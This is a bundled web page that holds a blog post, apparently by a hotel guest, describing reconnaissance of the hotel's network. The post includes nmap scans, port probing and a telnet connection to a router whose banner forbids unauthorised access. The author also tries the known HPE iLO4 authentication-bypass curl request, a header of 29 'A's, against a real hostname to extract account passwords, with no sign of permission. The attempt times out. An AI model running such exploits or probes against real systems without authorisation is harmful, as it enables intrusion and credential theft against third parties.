operator"}},[t._v("%")]),t._v("RID=G"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("RIPCK=G"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("RUCK=G"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("RUD=G"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("IE"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("R=Y"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("DFI=N"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("T=4\nOS:0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("CD=S"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nNetwork Distance: 1 hop\n\nOS detection performed"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" Please report any incorrect results at https:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("nmap"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("org"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("submit"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nNmap done: 1 IP address "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("1 host up"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" scanned in 16"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("57 seconds\n")])])]),e("p",[t._v("Okay, so we know that this is an HP server, and is likely running MS Windows. We can see that a bunch of ports are open, so let's see what we can find out.")]),t._v(" "),e("h3",{attrs:{id:"remote-terminal"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#remote-terminal","aria-hidden":"true"}},[t._v("#")]),t._v(" Remote terminal")]),t._v(" "),e("h4",{attrs:{id:"port-22-ssh"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-22-ssh","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 22 - SSH")]),t._v(" "),e("p",[t._v("Starting with port 22, which is open but filtered, we can use the "),e("code",[t._v("ssh")]),t._v(" tool to test for an SSH shell - although methinks we won't have much luck accessing that port:")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> ssh 10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1`\n\nssh: connect to host 10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1 port 22: Connection timed out\n")])])]),e("h3",{attrs:{id:"web-server"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#web-server","aria-hidden":"true"}},[t._v("#")]),t._v(" Web Server")]),t._v(" "),e("p",[t._v("It looks like this server is running not only a web server on ports 80 (HTTP) and 443 (encrypted HTTPS), but also likely a second web server, maybe for an admin interface, on incremented ports 81 and 444. Port 3128, as nmap tells us, is a Squid Proxy port, and also port 8080 is often used for proxies (as well as local web services built on NodeJS, Python, etc.). Let's see what happens when we try to connect to these ports:")]),t._v(" "),e("h4",{attrs:{id:"port-80-redirect"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-80-redirect","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 80 - Redirect")]),t._v(" "),e("p",[t._v("Port 80 redirects us to the hotel's homepage:")]),t._v(" "),e("p",[e("img",{attrs:{src:s(171),alt:"Port 80"}})]),t._v(" "),e("h4",{attrs:{id:"port-81-http"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-81-http","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 81 - HTTP")]),t._v(" "),e("p",[t._v("Port 81 tells us to sod off:")]),t._v(" "),e("p",[e("img",{attrs:{src:s(172),alt:"Port 81"}})]),t._v(" "),e("p",[t._v("A quick test of various paths (/admin, /login, /config, etc.) gives us a bunch of not found errors:")]),t._v(" "),e("p",[e("img",{attrs:{src:s(173),alt:"Port 81 /admin"}})]),t._v(" "),e("h4",{attrs:{id:"port-443-redirect"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-443-redirect","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 443 - Redirect")]),t._v(" "),e("p",[t._v("Port 443 does the same as port 80 above, redirecting us 😦.")]),t._v(" "),e("h4",{attrs:{id:"port-444-admin-interface"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-444-admin-interface","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 444 - Admin Interface")]),t._v(" "),e("p",[t._v("Although port 444 redirects us to the hotel homepage, digging a little further shows that visiting the /admin path gives us a login page:")]),t._v(" "),e("p",[e("img",{attrs:{src:s(174),alt:"Port 444"}})]),t._v(" "),e("p",[t._v("Yay, we've finally got somewhere. At this point, we'll leave this and move on to the next set of ports, rather than risking getting in trouble.")]),t._v(" "),e("h4",{attrs:{id:"port-1001"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-1001","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 1001")]),t._v(" "),e("p",[t._v("Port 1001 doesn't give us anything useful in a browser, and "),e("code",[t._v("telnet")]),t._v(" and "),e("code",[t._v("netcat")]),t._v(" don't give us anything useful either:")]),t._v(" "),e("p",[e("img",{attrs:{src:s(175),alt:"Port 1001"}})]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> nc 10"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("100"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1 1001\n\n"),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\>\n")])])]),e("h4",{attrs:{id:"port-3128"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-3128","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 3128")]),t._v(" "),e("p",[t._v("Port 3128 gives us a Squid error page, and usefully it also gives us a server name.")]),t._v(" "),e("p",[e("img",{attrs:{src:s(176),alt:"Port 3128"}})]),t._v(" "),e("h4",{attrs:{id:"port-8080"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-8080","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 8080")]),t._v(" "),e("p",[t._v("Port 8080 gives us the same Squid error page as port 3128.")]),t._v(" "),e("p",[e("img",{attrs:{src:s(177),alt:"Port 8080"}})]),t._v(" "),e("p",[t._v("A google search for the server name we just found at the bottom of the Squid error page turns up something interesting - a single result for an open iLO server:")]),t._v(" "),e("p",[e("img",{attrs:{src:s(178),alt:"Google Server Name Search"}})]),t._v(" "),e("h3",{attrs:{id:"integrated-lights-out"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#integrated-lights-out","aria-hidden":"true"}},[t._v("#")]),t._v(" Integrated Lights Out")]),t._v(" "),e("p",[t._v("iLO is Integrated Lights Out, and is a piece of management hardware in most HP servers which allows admins to manage servers remotely. If this is open to the internet, that's probably not a good idea, especially given that many versions of iLO have a "),e("a",{attrs:{href:"https://www.bleepingcomputer.com/news/security/you-can-bypass-authentication-on-hpe-ilo4-servers-with-29-a-characters/",target:"_blank",rel:"noopener noreferrer"}},[t._v("known security flaw"),e("OutboundLink")],1),t._v(":")]),t._v(" "),e("blockquote",[e("p",[t._v("Last year, a trio of security researchers discovered such a vulnerability, which they say it can be exploited remotely, via an Internet connection, putting all iLO servers exposed online at risk.")]),t._v(" "),e("p",[t._v("The vulnerability is an authentication bypass that allows attackers access to HP iLO consoles. Researchers say this access can later be used to extract cleartext passwords, execute malicious code, and even replace iLO firmware.")]),t._v(" "),e("p",[t._v('But besides being a remotely exploitable flaw, this vulnerability is also as easy as it gets when it comes to exploitation, requiring a cURL request and 29 letter "A" characters')])]),t._v(" "),e("p",[t._v("Wow! So, all we need to do to get a list of users and passwords for iLO is make a request to the iLO server's API and send it a bunch of \"A\"s. Let's give it a go:")]),t._v(" "),e("div",{staticClass:"language-batch extra-class"},[e("pre",{pre:!0,attrs:{class:"language-batch"}},[e("code",[e("span",{pre:!0,attrs:{class:"token command"}},[e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("C")]),e("span",{pre:!0,attrs:{class:"token label property"}},[t._v(":\\>curl")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token parameter attr-name"}},[t._v("-i")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token parameter attr-name"}},[t._v("-k")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token parameter attr-name"}},[t._v("-H")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"')]),t._v(" https://xxxxxxxx-akl-nz-lo.reivernet.com/rest/v1/AccountService"),e("span",{pre:!0,attrs:{class:"token parameter attr-name"}},[t._v("/Accounts")])]),t._v("\n\n"),e("span",{pre:!0,attrs:{class:"token command"}},[e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("curl")]),t._v(": ("),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("7")])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Failed to connect to xxxxxxxx-akl-nz-lo.reivernet.com port 443: Timed out\n")])])]),e("p",[t._v("Damn, nothing. Just to make sure, let's test a normal request to iLO that should be actively rejected by the server:")]),t._v(" "),e("div",{staticClass:"language-batch extra-class"},[e("pre",{pre:!0,attrs:{class:"language-batch"}},[e("code",[e("span",{pre:!0,attrs:{class:"token command"}},[e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("C")]),e("span",{pre:!0,attrs:{class:"token label property"}},[t._v(":\\>curl")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token parameter attr-name"}},[t._v("-i")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token parameter attr-name"}},[t._v("-k")]),t._v(" https://xxxxxxxx-akl-nz-lo.reivernet.com/rest/v1/AccountService"),e("span",{pre:!0,attrs:{class:"token parameter attr-name"}},[t._v("/Accounts")])]),t._v("\n\n"),e("span",{pre:!0,attrs:{class:"token command"}},[e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("curl")]),t._v(": ("),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("7")])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Failed to connect to xxxxxxxx-akl-nz-lo.reivernet.com port 443: Timed out\n")])])]),e("p",[t._v("Hmmm, okay - nothing again. We're expecting to see some JSON formatted data. Let's just check that we can see the server by pinging it:")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> ping xxxxxxxx"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("akl"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("nz"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("lo"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("reivernet"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com\nPinging xxxxxxxx"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("akl"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("nz"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("lo"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("reivernet"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" with 32 bytes of "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("data")]),t._v(":\nReply "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx: Destination host unreachable"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nReply "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx: Destination host unreachable"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nReply "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx: Destination host unreachable"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nReply "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx: Destination host unreachable"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\n\nPing statistics "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" 203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx:\n    Packets: Sent = 4"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" Received = 4"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" Lost = 0 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" loss"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n")])])]),e("p",[t._v("Okay, no ping response. Maybe they've moved the iLO port and told the server to not respond to ping requests. Let's run a quick nmap scan:")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> nmap "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("O xxxxxxxx"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("akl"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("nz"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("lo"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("reivernet"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com\n\nStarting Nmap 7"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("80 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" https:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("nmap"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("org "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" at 2019"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("08"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("25 23:15 New Zealand Standard Time\nNote: Host seems down"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("If")]),t._v(" it is really up"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" but blocking our ping probes"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("try")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Pn\nNmap done: 1 IP address "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0 hosts up"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" scanned in 5"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("41 seconds\n")])])]),e("p",[t._v("Hmmm, either this server's not accessible externally any more, or they've done a good job of making it appear dark online.")]),t._v(" "),e("p",[t._v("Looking into the security issue, and referencing our google search, it looks like the server's iLO is at 2.55, and the security flaw was patched in 2.54, so the server was likely not susceptible to that hack anyway.")]),t._v(" "),e("p",[t._v("Okay, so we followed the yellow brick road a little way and found a potential way in, but one that appears to have been cleaned up. Next up, let's have a look a the next hop on the way out from the hotel to the internet.")]),t._v(" "),e("h3",{attrs:{id:"cisco-router"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cisco-router","aria-hidden":"true"}},[t._v("#")]),t._v(" Cisco Router")]),t._v(" "),e("p",[t._v("Let's have a look at the second device on the way out of the hotel to the internet:")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> nmap "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("O 203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx\n\nStarting Nmap 7"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("80 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" https:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("nmap"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("org "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" at 2019"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("08"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("25 23:48 New Zealand Standard Time\nNmap scan report "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" 203"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx\nHost is up "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0017s latency"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n23"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp   open  telnet\n3128"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp open  squid"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http\n8080"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("tcp open  http"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("proxy\nDevice "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("type")]),t._v(": router"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("|")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("switch")]),t._v("\nRunning: Cisco IOS 12"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("X\nOS CPE: cpe:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("h:cisco:870_router cpe:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("o:cisco:ios:12 cpe:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("h:cisco:2960_switch\nOS details: Cisco 870 router or 2960 "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("switch")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("IOS 12"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("2 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" 12"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("4"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nNetwork Distance: 3 hops\n\nOS detection performed"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" Please report any incorrect results at https:"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("nmap"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("org"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("submit"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\nNmap done: 1 IP address "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("1 host up"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" scanned in 5"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("83 seconds\n")])])]),e("h4",{attrs:{id:"port-23-telnet"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-23-telnet","aria-hidden":"true"}},[t._v("#")]),t._v(" Port 23 - Telnet")]),t._v(" "),e("p",[t._v("Hmmm, that doesn't look very safe - this is a Cisco 870 router running CIOS 12.4 or lower and with port 23, for telnet, open to the public. Let's see if we can connect:")]),t._v(" "),e("div",{staticClass:"language-powershell extra-class"},[e("pre",{pre:!0,attrs:{class:"language-powershell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\> telnet 206"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("167"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xxx\n\nCC\nCC\nXXXXXXXX Auckland\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("-"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("-"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("-"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("-"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("-"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("\nAccess strictly prohibited"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" authorised personnel only\nplease contact the hotel IT Solutions Manager on\n09 353xxxx before proceeding"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" Or email\nhxxxx"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("it01@xxxxxxxxauckland"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("co"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("nz\nThank you"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\n\nUser Access Verification\n\nUsername:\n\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" Username:  timeout expired"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\n\nConnection to host lost"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\n")])])]),e("p",[t._v("Okay, so this seems like a bad idea. The hotel really shouldn't allow any kind of plain text connections to its router, and also shouldn't have this port open to their guests.")])])}),[],!1,null,null,null);a.default=n.exports}}]);